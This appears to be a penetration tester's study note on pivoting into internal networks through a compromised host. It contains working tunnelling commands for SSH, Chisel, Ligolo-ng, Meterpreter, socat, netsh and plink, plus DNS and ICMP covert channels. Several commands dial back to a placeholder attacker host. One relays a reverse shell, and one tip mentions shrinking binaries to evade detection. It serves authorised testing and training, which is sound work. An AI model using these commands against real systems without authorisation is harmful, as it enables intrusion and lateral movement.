> [!abstract] What this note is A field reference for getting traffic from your attack host into a network segment you can't reach directly, using a compromised host as the pivot. Organized by **tool**, but the thing to actually learn is the **decision logic** at the top.

---

## The one decision that drives everything

> [!important] Which way does the traffic flow? Every tunnel is either **forward** or **reverse**. Pick based on the firewall, not habit.
> 
> ||Who listens|Who connects|Use when|
> |---|---|---|---|
> |**Forward**|Pivot|You → pivot|You can reach an **inbound** port on the pivot|
> |**Reverse**|You|Pivot → you|Pivot **inbound is blocked**, but outbound is allowed (the common case)|
> 
> Reverse works more often in the real world because egress filtering is looser than ingress — but that's a tendency, not a rule. In your report, always state _why_: "host firewall dropped inbound, tunnelled reverse over 443."

> [!tip] Vocabulary that trips people up
> 
> - **Port forward** = expose ONE remote port locally (or vice versa). Surgical.
> - **SOCKS / dynamic** = proxy ALL traffic to a whole subnet. Broad.
> - **Tunnel** = the encrypted pipe carrying either of the above.

---

## proxychains — the glue

Most SOCKS-based pivots route tools through this.

bash

```bash
# /etc/proxychains.conf  (or proxychains4.conf)
[ProxyList]
socks5 127.0.0.1 1080     # match the port your tunnel opened (1080 chisel / 9050 ssh -D)
```

bash

```bash
proxychains nmap -sT -Pn -n 172.16.5.19        # TCP connect only — no raw sockets over SOCKS
proxychains xfreerdp /v:172.16.5.19 /u:user /p:pass
```

> [!warning] SOCKS eats UDP and raw packets Over a SOCKS proxy: use `-sT` (TCP connect), never `-sS`. No ping sweeps, no ICMP. Set `proxy_dns` on if you need name resolution through the tunnel.

---

## SSH tunnelling (built-in, no upload needed)

> [!example]- Local port forward — `-L` (pull one remote port to you)
> 
> bash
> 
> ```bash
> # localhost:1234 (yours) -> 3306 as seen FROM the pivot
> ssh -L 1234:172.16.5.19:3306 user@PIVOT
> # generic: -L [local_bind]:[dst_host]:[dst_port]
> ```
> 
> Good for hitting a single service on one internal host.

> [!example]- Dynamic / SOCKS — `-D` (whole subnet)
> 
> bash
> 
> ```bash
> ssh -D 9050 user@PIVOT        # opens SOCKS4/5 on 127.0.0.1:9050
> # then set proxychains -> socks5 127.0.0.1 9050
> ```
> 
> The SSH equivalent of a full pivot. Fast to stand up if you have creds.

> [!example]- Remote port forward — `-R` (reverse; push a port back to you)
> 
> bash
> 
> ```bash
> # on the pivot, forward its :8080 back to your :3389
> ssh -R 8080:172.16.5.19:3389 user@ATTACKER
> ```
> 
> Use when the pivot can't accept inbound but can dial out to you.

bash

```bash
# handy flags
-N   # don't run a remote command (tunnel only)
-f   # background
-v   # watch the handshake when it won't connect
```

---

## sshuttle — VPN-ish, zero proxychains

bash

```bash
sshuttle -r user@PIVOT 172.16.5.0/23
sshuttle -r user@PIVOT 172.16.5.0/23 --ssh-cmd "ssh -i key.pem"
```

> [!tip] Why it's nice Transparently routes the whole subnet at the OS level — run tools normally, no `proxychains` prefix. Needs Python on the pivot and SSH access.

---

## Chisel — when there's no SSH

Go binary, tunnels over HTTP secured with SSH. The workhorse when you only have a webshell/RCE and no SSH.

> [!example]- Forward (pivot listens)
> 
> bash
> 
> ```bash
> # pivot
> ./chisel server -v -p 1234 --socks5
> # attacker
> ./chisel client -v PIVOT_IP:1234 socks     # SOCKS opens on 127.0.0.1:1080
> ```

> [!example]- Reverse (you listen, pivot dials out) — the common one
> 
> bash
> 
> ```bash
> # attacker
> sudo ./chisel server --reverse -v -p 1234 --socks5
> # pivot
> ./chisel client -v ATTACKER_IP:1234 R:socks   # SOCKS opens on ATTACKER :1080
> ```

> [!bug] If it won't connect glibc / version mismatch is the usual culprit — grab an older **prebuilt** release from the repo instead of your locally built binary. Shrinking the binary (`upx`, build flags) also helps with transfer + detection.

---

## Ligolo-ng — the modern favourite

Increasingly the go-to for CPTS: gives you a real **tun interface**, so tools run natively (no `-sT` restriction, no proxychains).

bash

```bash
# attacker (proxy)
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert                       # listens :11601

# pivot (agent) — reverse by design, dials back to you
./agent -connect ATTACKER_IP:11601 -ignore-cert

# back in the proxy console
session                                 # pick the agent
# then route the target subnet to the tun interface:
sudo ip route add 172.16.5.0/24 dev ligolo
start
```

> [!tip] Why people switch to it Because it's a tun, `nmap -sS`, raw ICMP, and full UDP all work. Cleaner than layering proxychains over SOCKS.

---

## Meterpreter pivoting

bash

```bash
# route the subnet through the session
run autoroute -s 172.16.5.0/23
# or: use post/multi/manage/autoroute

# stand up a SOCKS proxy for external tools
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 5
run
# -> point proxychains at 127.0.0.1:9050

# single-port forward (no proxychains needed)
portfwd add -l 3300 -p 3389 -r 172.16.5.19   # local 3300 -> 172.16.5.19:3389
```

---

## socat — dumb relay (great as a redirector)

bash

```bash
# forward: anything hitting pivot:8080 -> internal host:80
socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:80

# reverse-shell relay through the pivot
socat TCP4-LISTEN:8080,fork TCP4:ATTACKER:80
```

> [!note] When socat shines No fancy SOCKS, just a bidirectional pipe. Perfect for bouncing a reverse shell off the pivot when the target can't reach you directly.

---

## Windows pivots

> [!example]- netsh portproxy (native, admin)
> 
> powershell
> 
> ```powershell
> netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 `
>   connectport=3389 connectaddress=172.16.5.25
> netsh interface portproxy show all
> netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
> # open the firewall for the listener if needed
> ```

> [!example]- plink (PuTTY link — SSH from Windows)
> 
> cmd
> 
> ```cmd
> plink -R 8080:127.0.0.1:3389 user@ATTACKER
> plink -ssh -D 9050 user@PIVOT
> ```

> [!example]- SocksOverRDP Load the DLL via `regsvr32`, connect RDP with the plugin, and you get a SOCKS proxy on `127.0.0.1:1080` tunnelled inside the RDP session. Useful when RDP is the only foothold.

---

## Covert channels (when TCP is filtered)

> [!example]- dnscat2 — DNS tunnelling
> 
> bash
> 
> ```bash
> # attacker (server)
> ruby ./dnscat2.rb --dns host=ATTACKER,port=53 --no-cache
> # pivot (client)
> ./dnscat2 --dns server=ATTACKER,port=53
> ```
> 
> Slow, but slips through when only DNS egress is allowed.

> [!example]- ptunnel-ng — ICMP tunnelling
> 
> bash
> 
> ```bash
> # pivot (server)
> sudo ./ptunnel-ng -r172.16.5.19 -R22
> # attacker (client)
> sudo ./ptunnel-ng -p PIVOT_IP -l2222 -r172.16.5.19 -R22
> ssh -p2222 user@127.0.0.1
> ```
> 
> For "ping works, nothing else does" networks.

---

## Quick port-forward direction cheat

> [!info] Mnemonic
> 
> - **`-L` L**ocal = pull something _toward_ me.
> - **`-R` R**emote/**R**everse = push something _back_ to me.
> - **`-D` D**ynamic = proxy _everything_.

---

## Methodology / reporting habit

> [!question] Four lines per pivot (post-box style) When you set up a tunnel, jot:
> 
> 1. **Foothold** — how you got on the pivot (creds? RCE?).
> 2. **Constraint** — what forced your choice (inbound blocked? no SSH? only DNS out?).
> 3. **Direction** — forward/reverse, tool, port.
> 4. **Reach** — what subnet/host it opened up.
> 
> That's your enumeration note _and_ the paragraph you paste into the report. Makes the "why" defensible instead of "I ran chisel."

> [!tip] Suggested vault links to build out `[[Active Directory Enumeration]]` · `[[proxychains config]]` · `[[nmap over SOCKS]]` · `[[Ligolo-ng setup]]` · `[[Report - Network Segmentation Findings]]`